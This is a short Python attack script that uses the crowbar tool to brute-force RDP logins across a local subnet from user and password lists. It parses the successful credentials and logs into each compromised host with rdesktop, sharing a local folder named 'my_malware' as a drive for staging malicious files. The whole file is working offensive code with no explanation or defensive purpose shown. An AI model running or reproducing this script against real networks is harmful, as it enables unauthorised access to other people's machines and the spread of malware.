#!/usr/bin/python
from subprocess import check_output, STDOUT
import os
def rdp_connect(target):
	ip = target[0]
	username, password = target[1]
	#print (ip, username, password)
	command = "rdesktop -u " + username + " -p " + password +  " " + ip + " -r disk:X=/root/crowbar/my_malware"
	os.system(command)

command = "python /root/crowbar/crowbar.py -b rdp -s 192.168.249.0/24 -U users -C passwords -d"
#command = "python /root/crowbar/crowbar.py -b rdp -s 10.255.0.142/32 -U users -C passwords -d"
output = check_output(command, stderr = STDOUT , shell = True)
results = output.split("\n")
target_list = {}
for i in results:
	if "RDP-SUCCESS" in i:
		temp = i.split(" : ")[1]
		temp = temp.split(" - ")
		server = temp[0].split(":")[0][9:]
		temp = temp[1].split(":")
		username = temp[0]
		password = temp[1][:-4]
		target_list.update({server:(username, password)})

for i in target_list.items():
	rdp_connect(i)

